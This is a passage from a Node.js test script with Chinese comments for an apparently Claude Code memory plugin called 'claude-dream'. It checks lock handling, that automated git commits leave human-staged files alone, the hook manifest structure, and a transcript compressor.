  check('锁已换成当前进程的 pid', JSON.parse(readFileSync(lockPath, 'utf8')).pid === process.pid);

  // 活 pid：写一把"当前进程自己"的锁，必然存活，acquireLock 不该抢。
  releaseLock(lockPath);
  writeFileSync(lockPath, JSON.stringify({ pid: process.pid, acquiredAt: new Date().toISOString() }));
  check('活 pid 的锁判定为非 stale（别抢活锁）', isStaleLock(lockPath) === false);
  check('活锁不被抢（acquireLock 返回 false）', acquireLock(lockPath) === false);

  // 损坏锁：读不出 pid，按残留处理（宁可清掉也不永久卡死）。
  releaseLock(lockPath);
  writeFileSync(lockPath, 'not-json-at-all');
  check('读不出 pid 的损坏锁按残留处理', isStaleLock(lockPath) === true);

  releaseLock(lockPath);
  rmSync(tmpDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
}

async function testCommitPathspecDoesNotSwallowHumanStaged() {
  // D3 review 三轮抓到的坑：git commit 不带 pathspec 时提交整个暂存区，人类会话中途手动 git add 的
  // 无关文件会被连坐吞进 dream: 提交。修复 = stagedFiles 和 commit 都限定与 add 相同的 pathspec。
  // 预置一个人类 staged 的无关文件，跑一场梦，断言它既不进 dream: 提交、也不被 reset 清掉。
  // 复审又指出：梦前快照的 commit 分支（有运行态文件 + 有待提交 memory 改动）从未被测试跑到，导致
  // 发现 1 漏网。这里一并预置这两个条件，让 preDreamSnapshot 真走进 commit 分支，验证空 .claude/dream
  // 目录不再让 commit -- 报 "pathspec did not match"。
  const sandbox = makeSandbox('pathspec');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== D3 三轮回归：dream 提交不吞人类暂存 + 梦前快照空目录不炸（沙箱: ${sandbox}） ===`);

  // 1) 人类会话中途 stage 一个无关文件
  writeFileSync(path.join(sandbox, 'README.md'), 'human staged change\n');
  git(sandbox, ['add', 'README.md']);

  // 2) 让梦前快照有"待提交 memory 改动" + ".claude/dream 有运行态文件"，迫使 preDreamSnapshot 走进
  //    commit 分支（这正是复审发现 1 的空目录 pathspec 会炸的场景）
  mkdirSync(paths.dreamDir, { recursive: true });
  writeFileSync(paths.memoryIndex, readFileSync(paths.memoryIndex, 'utf8') + '\n<!-- pathspec 回归钉子 -->\n');
  writeFileSync(paths.lastDreamState, JSON.stringify({ lastDreamAt: '2020-01-01T00:00:00.000Z', status: 'running' }));

  const result = runNode(path.join(SRC, 'run-dream.mjs'), [sandbox], { cwd: sandbox });
  check('直接跑 run-dream 正常返回（退出码 0）', result.status === 0, result.stderr);

  // 3) 梦前快照提交成功（修复前这里会因空 .claude/dream 目录报 did not match 而整场梦中断）
  const preSha = git(sandbox, ['log', '--oneline', '--grep=^dream-pre:', '-1', '--format=%H']);
  check('梦前快照 dream-pre: 提交成功（空 .claude/dream 目录没炸）', !!preSha, preSha);
  if (preSha) {
    const preFiles = git(sandbox, ['show', '--name-only', '--pretty=format:', preSha]).split('\n').map((l) => l.trim()).filter(Boolean);
    check('dream-pre 提交不含运行态文件 last-dream.json', !preFiles.includes('.claude/dream/last-dream.json'), preFiles.join(', '));
    check('dream-pre 提交不含人类 README.md', !preFiles.includes('README.md'));
  }

  // 4) dream: 提交不含人类 README，README 仍保持 staged
  const dreamSha = git(sandbox, ['log', '--oneline', '--grep=^dream:', '-1', '--format=%H']);
  const dreamFiles = dreamSha
    ? git(sandbox, ['show', '--name-only', '--pretty=format:', dreamSha]).split('\n').map((l) => l.trim()).filter(Boolean)
    : [];
  check('dream: 提交不含人类无关的暂存文件 README.md', dreamFiles.length > 0 && !dreamFiles.includes('README.md'), dreamFiles.join(', '));

  const staged = git(sandbox, ['diff', '--cached', '--name-only']).split('\n').filter(Boolean);
  check('人类暂存的 README.md 仍保持 staged（未被吞、未被 reset）', staged.includes('README.md'), staged.join(', '));

  return sandbox;
}

function testPluginManifestShape() {
  // D3 review 抓到的坑：hooks.json 曾经缺顶层 "hooks" 包裹键（{"SessionEnd":[...]} 而不是
  // {"hooks":{"SessionEnd":[...]}}）——那是 .claude/settings.json 的格式，不是插件 hooks.json 的格式，
  // Claude Code 的插件加载器大概率根本不认。这类 schema 错误纯手工排查容易漏，写进自证脚本才靠得住。
  console.log('\n=== 插件清单结构形状检查（对应 AC1，纯静态，不起会话） ===');

  const pluginJsonPath = path.join(PLUGIN_ROOT, '.claude-plugin', 'plugin.json');
  const hooksJsonPath = path.join(PLUGIN_ROOT, 'hooks', 'hooks.json');

  let pluginJson = null;
  try {
    pluginJson = JSON.parse(readFileSync(pluginJsonPath, 'utf8'));
  } catch {
    // leave null，下面的 check 会失败并报出来
  }
  check('plugin.json 存在且是合法 JSON', !!pluginJson);
  check('plugin.json.name 是 "claude-dream"', pluginJson?.name === 'claude-dream');

  let hooksJson = null;
  try {
    hooksJson = JSON.parse(readFileSync(hooksJsonPath, 'utf8'));
  } catch {
    // ignore
  }
  check('hooks.json 存在且是合法 JSON', !!hooksJson);
  check('hooks.json 顶层有 "hooks" 包裹键（不是裸 {"SessionEnd":[...]}）', !!hooksJson?.hooks && !hooksJson?.SessionEnd);
  for (const event of ['SessionEnd', 'SessionStart']) {
    const entries = hooksJson?.hooks?.[event];
    check(`hooks.json.hooks.${event} 是非空数组`, Array.isArray(entries) && entries.length > 0);
    const cmd = entries?.[0]?.hooks?.[0];
    check(
      `${event} 第一条 hook 的 command 用 \${CLAUDE_PLUGIN_ROOT} 引用脚本`,
      typeof cmd?.command === 'string' && cmd.command.includes('${CLAUDE_PLUGIN_ROOT}') && cmd.type === 'command'
    );
  }

  const marketplacePath = path.join(PLUGIN_ROOT, '..', '.claude-plugin', 'marketplace.json');
  if (existsSync(marketplacePath)) {
    const marketplace = JSON.parse(readFileSync(marketplacePath, 'utf8'));
    const entry = marketplace.plugins?.find((p) => p.name === 'claude-dream');
    check('marketplace.json 里的 claude-dream 条目 source 指向 ./claude-dream', entry?.source === './claude-dream');
  }
}

function testNegativesZeroApiAndCompressUnit() {
  // AC2「验法写死：压缩链路不引用 Agent SDK」——静态源码检查，不是运行时行为断言：
  // 直接读 negatives/ 目录下每个源文件，确认没有一处 import 了 SDK 包名。
  console.log('\n=== PBI-01.1·AC2 零 API 静态检查 + compress.mjs 纯函数单测（不起会话） ===');

  const negativesDir = path.join(SRC, 'negatives');
  const sdkPackageName = '@anthropic-ai/claude-agent-sdk';
  for (const file of readdirSync(negativesDir).filter((f) => f.endsWith('.mjs'))) {
    const content = readFileSync(path.join(negativesDir, file), 'utf8');
    check(`AC2 零 API：negatives/${file} 不引用 ${sdkPackageName}`, !content.includes(sdkPackageName));
  }

  return import(pathToFileURL(path.join(negativesDir, 'compress.mjs')).href).then(({ compressEntries }) => {
    const marker = 'UNIT-TEST-MARKER-abc123';
    const entries = [
      { type: 'user', message: { role: 'user', content: [{ type: 'text', text: marker }] } },
      { type: 'user', message: { role: 'user', content: [{ tool_use_id: 't1', type: 'tool_result', content: 'x'.repeat(500), is_error: false }] } },
      { type: 'assistant', message: { content: [{ type: 'thinking', thinking: 'y'.repeat(500) }] } },
      { type: 'assistant', message: { content: [{ type: 'text', text: '回复文本' }] } },
      { type: 'this-type-does-not-exist-yet', weird: true },
    ];
    const { markdown, stats } = compressEntries(entries);

    check('AC3 用户文本原文保留（两种结构之一：content 数组含 text）', markdown.includes(marker));
    check('AC3② 工具返回（以 user 角色记录）摘要化：不含完整 500 字正文', !markdown.includes('x'.repeat(500)));
    check('AC3④ assistant thinking 摘要化：不含完整 500 字正文', !markdown.includes('y'.repeat(500)));
    check('assistant 正文原样保留', markdown.includes('回复文本'));
    check('AC3③ 未知类型保守保留＋留痕：标记 unknown 且原样带 raw', markdown.includes('UNKNOWN') && markdown.includes('this-type-does-not-exist-yet'));
    check('stats.byKind.unknown 计数正确', stats.byKind.unknown === 1, JSON.stringify(stats.byKind));
  });
}

const sandboxes = [];
try {
  testScopeGuardUnit();
  testPluginManifestShape();
  await testNegativesZeroApiAndCompressUnit();
  await testNotebookEditFieldName();
  await testStaleLockDetection();
  sandboxes.push(await testFullChainAndRevertAndCooldownAndRecursion());
  sandboxes.push(await testNegativesFaultInjection());
  await testBackfillNegatives();
  sandboxes.push(await testConcurrentTriggerLock());
  sandboxes.push(await testRogue());
  sandboxes.push(await testRogueTargetsNegativesDir());
  sandboxes.push(await testCommitPathspecDoesNotSwallowHumanStaged());
} finally {
  const failed = results.filter((r) => !r.pass);
  console.log(`\n=== 结果：${results.length - failed.length}/${results.length} 通过 ===`);
  if (failed.length) {
    console.log('失败项:');
    for (const f of failed) console.log(`  - ${f.name}${f.detail ? ' :: ' + f.detail : ''}`);
  }
  console.log(`\n沙箱目录（失败时保留供排查，全绿可删）: ${sandboxes.join(', ')}`);
  if (!failed.length) {
    for (const s of sandboxes) {
      try {
        // Windows 下 git.exe/杀毒软件等偶发地在进程刚退出那一刻仍占着文件句柄，rmSync 会报
        // 瞬时性的 EPERM——maxRetries/retryDelay 是 Node 官方给这个场景的解法（间隔重试等锁自然释放）。
        // 清理失败本身不该让一次全绿的测试跑报出非零退出码：这是收尾动作,不是断言。
        rmSync(s, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
      } catch (err) {
        console.log(`（沙箱清理失败，忽略，不影响测试结果）: ${s} :: ${String(err?.message ?? err)}`);
      }
    }
  }
  process.exit(failed.length ? 1 : 0);
}
